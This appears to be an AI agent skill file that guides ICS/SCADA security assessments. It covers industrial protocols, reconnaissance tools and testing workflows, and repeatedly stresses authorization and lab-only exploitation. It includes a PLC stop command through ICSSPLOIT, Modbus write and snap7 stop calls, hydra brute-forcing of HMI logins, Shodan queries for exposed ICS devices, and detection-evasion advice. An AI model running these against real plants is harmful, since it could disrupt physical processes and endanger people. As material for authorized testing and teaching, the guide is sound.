---
name: scada_ics
description: Learn ICS/SCADA security assessment: OT network architecture, Modbus/DNP3/OPC-UA/S7comm/BACnet/EtherNet-IP protocols, PLC/HMI/historian exploitation, and safety-critical testing with strict operational constraints.
---
# ICS/SCADA Security Assessment

## When to Use This Skill

- Assessing industrial control systems or SCADA environments
- Testing OT network segmentation and IT/OT boundaries
- Exploiting industrial protocols (Modbus, DNP3, S7comm, OPC-UA, BACnet)
- Attacking PLCs, HMIs, RTUs, or engineering workstations
- Evaluating safety instrumented systems (SIS)
- Conducting ICS penetration tests with operational safety constraints

---

## CRITICAL: Safety and Operational Constraints

### Before ANY Testing

1. **Written Authorization** — Explicit approval from asset owner AND plant operations
2. **Isolation Requirements** — Test in isolated lab or during maintenance windows
3. **Rollback Procedures** — Document recovery steps before testing
4. **Emergency Contacts** — Plant operators, safety personnel on standby
5. **Impact Assessment** — Understand physical consequences of each action

### Never Do

- Test production systems without explicit authorization and maintenance window
- Send commands that could affect physical processes (valve positions, motor states)
- Perform denial-of-service testing on live systems
- Modify PLC logic on production controllers
- Disable or bypass safety instrumented systems

### Testing Hierarchy (Safest First)

1. **Passive analysis** — Traffic capture, protocol analysis
2. **Non-intrusive scanning** — Device identification, banner grabbing
3. **Read-only operations** — Register reads, configuration queries
4. **Write operations** — Only in isolated environments
5. **Exploitation** — Lab environments only

---

## ICS Architecture

### Purdue Model (Levels 0-5)

| Level | Name | Components |
|-------|------|------------|
| 5 | Enterprise | Corporate IT, ERP systems |
| 4 | Business Planning | Business logistics, databases |
| 3.5 | DMZ | Historians, jump servers, patch servers |
| 3 | Operations | HMI, SCADA servers, engineering workstations |
| 2 | Control | PLCs, RTUs, DCS controllers |
| 1 | Basic Control | I/O modules, sensors, actuators |
| 0 | Process | Physical equipment, valves, motors |

### Key Components

- **PLC (Programmable Logic Controller)** — Executes control logic, interfaces with I/O
- **RTU (Remote Terminal Unit)** — Remote data acquisition and control
- **HMI (Human-Machine Interface)** — Operator visualization and control
- **SCADA Server** — Centralized monitoring and control
- **Historian** — Time-series data storage and trending
- **Engineering Workstation** — PLC programming and configuration
- **SIS (Safety Instrumented System)** — Emergency shutdown, separate from control

### IEC 62443 Zones and Conduits

**Zones** — Logical groupings of assets with common security requirements
**Conduits** — Controlled communication paths between zones

Security Levels (SL):
- **SL 1** — Protection against unintentional misuse
- **SL 2** — Protection against intentional misuse with simple means
- **SL 3** — Protection against sophisticated attacks with moderate resources
- **SL 4** — Protection against advanced threats with extensive resources

---

## OT Network Reconnaissance

### Passive Discovery (Preferred)

```bash
# Capture OT traffic for protocol analysis
tcpdump -i eth0 -w ot_capture.pcap 'port 502 or port 102 or port 44818 or port 47808 or port 20000'

# Wireshark filters for ICS protocols
modbus         # Modbus TCP (port 502)
s7comm         # Siemens S7 (port 102)
enip           # EtherNet/IP (port 44818)
bacnet         # BACnet (port 47808)
dnp3           # DNP3 (port 20000)
opcua          # OPC-UA (port 4840)

# Identify vendors from MAC OUI
# Siemens: 00:0E:8C, 00:1C:06
# Rockwell: 00:00:BC
# Schneider: 00:80:F4
# ABB: 00:21:99
```

### Active Discovery (Use Caution)

```bash
# Nmap with ICS scripts (SLOW timing to avoid disruption)
nmap -sT -Pn -n -T2 -p 102,502,44818,47808,20000,4840 --script modbus-discover,s7-info,enip-info 192.168.1.0/24

# Metasploit Modbus detection
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 192.168.1.0/24
set THREADS 1
run

# Metasploit Profinet/Siemens discovery (Layer 2, safe)
use auxiliary/scanner/scada/profinet_siemens
set INTERFACE eth0
run

# Metasploit S7 device info
use auxiliary/scanner/scada/s7_udp_discover
set RHOSTS 192.168.1.0/24
run
```

### Shodan/Censys Reconnaissance

```
# Shodan queries for exposed ICS
port:502 modbus
port:102 s7
"Siemens" port:102
"Rockwell" port:44818
"Schneider Electric"
port:47808 bacnet
port:20000 dnp3
"PLC" country:US
```

---

## Industrial Protocols

### Modbus TCP (Port 502)

**Protocol Characteristics:**
- No authentication, no encryption
- Simple request/response model
- Unit ID addressing (1-247)
- Function codes for read/write operations

**Key Function Codes:**

| Code | Function | Operation |
|------|----------|-----------|
| 0x01 | Read Coils | Read discrete outputs (1-bit) |
| 0x02 | Read Discrete Inputs | Read discrete inputs (1-bit) |
| 0x03 | Read Holding Registers | Read analog outputs (16-bit) |
| 0x04 | Read Input Registers | Read analog inputs (16-bit) |
| 0x05 | Write Single Coil | Write single discrete output |
| 0x06 | Write Single Register | Write single analog output |
| 0x0F | Write Multiple Coils | Write multiple discrete outputs |
| 0x10 | Write Multiple Registers | Write multiple analog outputs |

**Metasploit Modules:**

```
# Detect Modbus
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 192.168.1.100
run

# Find valid Unit IDs
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS 192.168.1.100
run

# Read/write registers
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.1.100
set DATA_ADDRESS 0
set NUMBER 10
set ACTION READ_HOLDING_REGISTERS
run

# Banner grabbing
use auxiliary/scanner/scada/modbus_banner_grabbing
set RHOSTS 192.168.1.100
run
```

**Python with pymodbus:**

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Read holding registers (address 0, count 10)
result = client.read_holding_registers(0, 10, slave=1)
print(result.registers)

# Read coils
result = client.read_coils(0, 8, slave=1)
print(result.bits)

# Write single register (DANGEROUS - lab only)
# client.write_register(0, 100, slave=1)

# Write single coil (DANGEROUS - lab only)
# client.write_coil(0, True, slave=1)

client.close()
```

**mbtget (Perl tool):**

```bash
# Read holding registers
mbtget -r3 -a 0 -n 10 192.168.1.100

# Read coils
mbtget -r1 -a 0 -n 8 192.168.1.100

# Read input registers
mbtget -r4 -a 0 -n 10 192.168.1.100
```

**2024 Threat: FrostyGoop Malware**
First malware to use Modbus TCP for direct ICS device interaction. Used in January 2024 attack causing heating outages in Ukraine. Highlights need for OT-native threat detection — standard AV doesn't inspect Modbus traffic.

---

### S7comm / S7comm-Plus (Port 102)

**Protocol Characteristics:**
- Siemens proprietary protocol for S7 PLCs
- S7comm (S7-300/400) — No encryption or authentication
- S7comm-Plus (S7-1200/1500) — Encryption, anti-replay (but bypassable)
- TSAP (Transport Service Access Point) addressing

**Metasploit Modules:**

```
# S7 device info
use auxiliary/scanner/scada/s7_enumerate_plc
set RHOSTS 192.168.1.100
run
# Returns: module type, serial, firmware, CPU state

# Profinet discovery
use auxiliary/scanner/scada/profinet_siemens
set INTERFACE eth0
run
```

**snap7 (Python):**

```python
import snap7

# Connect to S7-300/400
plc = snap7.client.Client()
plc.connect('192.168.1.100', 0, 1)  # IP, rack, slot

# Get CPU info
info = plc.get_cpu_info()
print(f"Module: {info.ModuleTypeName}")
print(f"Serial: {info.SerialNumber}")

# Read data block (DB1, start 0, size 100)
data = plc.db_read(1, 0, 100)

# Get CPU state
state = plc.get_cpu_state()
print(f"CPU State: {state}")

# Read inputs/outputs
inputs = plc.eb_read(0, 1)   # Read input byte 0
outputs = plc.ab_read(0, 1)  # Read output byte 0
markers = plc.mb_read(0, 1)  # Read marker byte 0

# DANGEROUS - Lab only
# plc.plc_stop()   # Stop CPU
# plc.plc_cold_start()  # Cold restart
# plc.db_write(1, 0, data)  # Write to data block

plc.disconnect()
```

**ISF/ICSSPLOIT:**

```bash
# Industrial Exploitation Framework
python isf.py

isf> use exploits/plcs/siemens/s7_300_400_plc_control
isf> set target 192.168.1.100
isf> set command stop  # or start
isf> run
```

**Known S7 Attacks:**
- CPU stop/start without authentication (S7-300/400)
- Password bypass on older firmware
- Logic upload/download manipulation
- Time-of-Day interrupt injection
- Anti-replay bypass on S7comm-Plus (research demonstrated)

---

### OPC-UA (Port 4840)

**Protocol Characteristics:**
- Modern industrial protocol with security features
- BUT: Security is optional and often disabled
- Supports encryption, authentication, signing
- Cross-platform, vendor-neutral

**Enumeration:**

```bash
# Nmap OPC-UA discovery
nmap -sT -p 4840 --script opcua-discover 192.168.1.100
```

**Claroty OPC-UA Exploit Framework:**

```python
# github.com/claroty/opcua-exploit-framework
# Advanced fuzzing and exploitation framework

# Server types supported: softing, unified, prosys, kepware,
# triangle, dotnetstd, open62541, ignition, rust, node-opcua,
# opcua-python, milo

# Fuzzing techniques:
# - Bitflip, byteflip
# - Arithmetic mutations
# - Magic number insertion
```

**python-opcua:**

```python
from opcua import Client

client = Client("opc.tcp://192.168.1.100:4840")

# Try anonymous connection (often works)
try:
    client.connect()

    # Browse root node
    root = client.get_root_node()
    objects = client.get_objects_node()

    # Enumerate nodes
    for node in root.get_children():
        print(f"Node: {node.get_browse_name()}")

    client.disconnect()
except Exception as e:
    print(f"Connection failed: {e}")
```

**Common OPC-UA Vulnerabilities:**
- Anonymous access enabled (80% of implementations)
- Security mode set to "None" by default
- Missing trust list validation
- Weak certificate validation
- Used by PIPEDREAM/MOUSEHOLE malware

---

### DNP3 (Port 20000)

**Protocol Characteristics:**
- Used extensively in power grid, water/wastewater
- 75%+ of North American electric utilities use DNP3
- Master-outstation architecture
- Secure Authentication (SA v5) available but rarely enabled
- All data transmitted in cleartext by default

**Key Function Codes:**

| Code | Function |
|------|----------|
| 0x01 | Read |
| 0x02 | Write |
| 0x03 | Select (before operate) |
| 0x04 | Operate |
| 0x0D | Cold Restart |
| 0x0E | Warm Restart |
| 0x12 | Stop Application |
| 0x14 | Disable Unsolicited Messages |

**Common DNP3 Attacks:**
- Master impersonation (no authentication)
- Packet replay attacks
- Cold/warm restart commands
- Disable unsolicited messages (blind operators)
- Function code injection

**Nmap DNP3 Scripts:**

```bash
nmap -sT -p 20000 --script dnp3-info 192.168.1.100
```

**Mitigation:**
- Enable DNP3 Secure Authentication
- Implement TLS transport
- Network segmentation
- Protocol-aware firewall rules

---

### BACnet (Port 47808/UDP)

**Protocol Characteristics:**
- Building automation and HVAC systems
- Designed without security (air-gapped assumption)
- Millions of devices lack authentication/encryption
- Easily exploitable if network-accessible

**Enumeration:**

```bash
# Nmap BACnet discovery
nmap -sU -p 47808 --script bacnet-info --script-args full=yes 192.168.1.100
```

**Metasploit BACnet Module:**

```
use auxiliary/scanner/scada/bacnet_discover
set RHOSTS 192.168.1.0/24
run
# Discovers devices using Who-Is messages
```

**Common BACnet Attacks:**
- Unauthorized property writes (temperature setpoints, schedules)
- Device manipulation (start/stop equipment)
- DoS via protocol flooding
- Man-in-the-middle (no encryption)
- Command injection

---

### EtherNet/IP and CIP (Port 44818)

**Protocol Characteristics:**
- Common Industrial Protocol over Ethernet
- Widely used with Rockwell/Allen-Bradley PLCs
- CIP Security available but not universally deployed
- Implicit (real-time) and explicit messaging

**Enumeration:**

```bash
# Nmap EtherNet/IP
nmap -sT -p 44818 --script enip-info 192.168.1.100
```

**Known Vulnerabilities:**
- OpENer stack vulnerabilities (CVE-2021-27478, CVE-2020-13556)
- Socket object abuse for reconnaissance/exfiltration
- Connection hijacking
- DoS via malformed packets

---

### PROFINET (Layer 2)

**Protocol Characteristics:**
- Siemens industrial Ethernet protocol
- DCP (Discovery and Configuration Protocol) for discovery
- Often vulnerable to DoS

**Metasploit:**

```
use auxiliary/scanner/scada/profinet_siemens
set INTERFACE eth0
run
# Layer 2 discovery, single packet, safe
```

**Known Vulnerabilities:**
- CVE-2020-28400: DoS via DCP packets
- CVE-2017-2681: DoS via crafted PROFINET DCP packets
- No authentication in legacy implementations

---

## PLC Exploitation

### Vendor-Specific Considerations

| Vendor | Common Protocols | Key Tools |
|--------|------------------|-----------|
| Siemens | S7comm, PROFINET | snap7, ICSSPLOIT, Metasploit |
| Rockwell | EtherNet/IP, CIP | Metasploit, custom scripts |
| Schneider | Modbus, UMAS | pymodbus, ICSSPLOIT |
| ABB | Modbus, proprietary | pymodbus |
| GE | Modbus, proprietary | pymodbus |

### Attack Vectors

1. **Network Access** — Most common entry point
2. **Engineering Workstation Compromise** — Access to programming software
3. **Removable Media** — USB attacks (Stuxnet vector)
4. **Supply Chain** — Compromised firmware/updates

### Generic PLC Attack Workflow (Lab Only)

```
1. Reconnaissance
   - Identify PLC vendor and model
   - Determine protocol and firmware version
   - Check for known CVEs

2. Enumeration
   - Query device information
   - Enumerate I/O configuration
   - Read current register/coil values

3. Analysis
   - Map register addresses to physical processes
   - Identify critical control points
   - Understand safety interlocks

4. Exploitation (isolated lab)
   - Test write operations
   - Attempt logic modification
   - Evaluate denial-of-service impact
```

---

## HMI Exploitation

### Common HMI Vulnerabilities

| Vulnerability | Examples |
|---------------|----------|
| Default credentials | admin/admin, guest/guest |
| Command injection | CGI scripts, debug interfaces |
| Authentication bypass | Buffer overflows, session manipulation |
| XSS/SQLi | Web-based HMIs |
| Outdated OS | Windows XP/7 embedded |

### Testing Approach

```bash
# Web HMI scanning
nikto -h http://192.168.1.100

# Default credential testing
hydra -l admin -P /usr/share/wordlists/hmi_passwords.txt http-get://192.168.1.100/

# Common HMI paths
/cgi-bin/
/webvisu.htm
/plcprog/
/config/
/diagnostics/
```

### Recent HMI CVEs (2023-2024)

- **CVE-2023-40145** (Weintek): OS command injection via CGI
- **CVE-2023-43492** (Weintek): Stack buffer overflow, auth bypass
- **CVE-2021-44453** (mySCADA): Command injection, CVSS 10.0
- **CVE-2025-0960** (AutomationDirect): Buffer overflow RCE

---

## Historian Exploitation

### Historian Access

```bash
# SQL Server historians (Wonderware, OSIsoft PI)
nmap -sT -p 1433 192.168.1.100

# PI Web API
curl https://192.168.1.100/piwebapi/
```

### Attack Scenarios

- Credential theft for process data access
- Historical data manipulation (cover tracks)
- Pivot point to control networks
- Business intelligence exfiltration

---

## Safety Instrumented Systems (SIS)

### TRITON/TRISIS Attack (Reference)

First malware targeting SIS, discovered 2017 at Saudi petrochemical plant:

1. Infected Windows engineering workstation
2. Communicated with Triconex SIS controller
3. Reverse-engineered TriStation protocol
4. Attempted to disable safety functions
5. Goal: Enable physical damage by bypassing safety

**Key Lessons:**
- SIS should be isolated from control networks
- Keyswitch should be in RUN mode, not PROGRAM
- Monitor for unauthorized engineering connections
- Safety systems require dedicated security assessment

### SIS Testing Constraints

- **NEVER** test production SIS
- Tabletop exercises for safety scenario analysis
- Verify network isolation only
- Configuration review without modification

---

## Metasploit ICS Modules Reference

### Scanners

| Module | Purpose |
|--------|---------|
| `auxiliary/scanner/scada/modbusdetect` | Detect Modbus service |
| `auxiliary/scanner/scada/modbusclient` | Read/write Modbus registers |
| `auxiliary/scanner/scada/modbus_findunitid` | Enumerate Unit IDs |
| `auxiliary/scanner/scada/modbus_banner_grabbing` | Device fingerprinting |
| `auxiliary/scanner/scada/profinet_siemens` | Siemens device discovery |
| `auxiliary/scanner/scada/s7_udp_discover` | S7 device discovery |
| `auxiliary/scanner/scada/bacnet_discover` | BACnet device discovery |

### Exploitation (Lab Only)

```
# Modbus write operations
use auxiliary/scanner/scada/modbusclient
set ACTION WRITE_REGISTER
set DATA_ADDRESS 0
set DATA 1234
set RHOSTS 192.168.1.100
run
```

---

## ICS-Specific Tools

### Exploitation Frameworks

| Tool | Description |
|------|-------------|
| ISF/ICSSPLOIT | Metasploit-like framework for ICS |
| Moki | Kali modification for ICS testing |
| SamuraiSTFU | Security testing distribution for OT |
| GRFICSv2 | Virtual ICS lab for training |

### Protocol Tools

| Tool | Protocol | Purpose |
|------|----------|---------|
| pymodbus | Modbus | Python Modbus library |
| snap7 | S7comm | Siemens PLC communication |
| python-opcua | OPC-UA | OPC-UA client/server |
| mbtget | Modbus | CLI Modbus testing |
| plcscan | Multiple | PLC discovery |

### Traffic Analysis

```bash
# Wireshark with ICS dissectors
wireshark -i eth0 -k -f 'port 502 or port 102'

# Zeek/Bro with ICS protocol parsers
zeek -r capture.pcap local
```

---

## Evasion and OPSEC

### Traffic Blending

- Use protocol-conformant messages
- Match normal timing patterns
- Avoid scanning during production hours
- Single-threaded, slow operations

### Detection Avoidance

- Passive reconnaissance preferred
- Read operations generate less logging than writes
- Avoid triggering OT-specific anomaly detection
- Monitor for protocol violations (your own traffic)

### What Gets Detected

- High-volume scanning
- Write operations to unusual addresses
- PLC stop/start commands
- Logic downloads outside maintenance windows
- Connections from unauthorized IPs

---

## Compliance and Standards Context

| Standard | Scope |
|----------|-------|
| NIST SP 800-82 | ICS security guide |
| IEC 62443 | Industrial automation security |
| NERC CIP | North American power grid |
| TSA Pipeline Security | Pipeline systems |
| CFATS | Chemical facilities |

---

## Workflows

### ICS Network Assessment

```
1. Scope Definition
   - Define boundaries and constraints
   - Identify critical assets and safety systems
   - Establish communication with plant operations

2. Passive Reconnaissance
   - Network traffic capture
   - Protocol identification
   - Asset inventory from traffic

3. Active Enumeration (Maintenance Window)
   - Device discovery with safe scanners
   - Protocol fingerprinting
   - Configuration queries

4. Vulnerability Assessment
   - Compare against known CVEs
   - Identify misconfigurations
   - Check for default credentials

5. Exploitation (Lab Mirror Only)
   - Replicate critical systems in lab
   - Test exploitation techniques
   - Document impact

6. Reporting
   - Risk-prioritized findings
   - Operational context
   - Remediation roadmap
```

### Protocol Testing Workflow

```
1. Identify protocol and port
2. Capture sample traffic
3. Decode with Wireshark
4. Enumerate using appropriate tool
5. Document device responses
6. Test read operations
7. Lab-only: Test write operations
8. Document findings with operational context
```

### PLC Security Assessment

```
1. Identify vendor, model, firmware
2. Query device information (read-only)
3. Check for known vulnerabilities
4. Assess authentication/access control
5. Review network exposure
6. Lab-only: Test exploitation
7. Document risks and mitigations
```
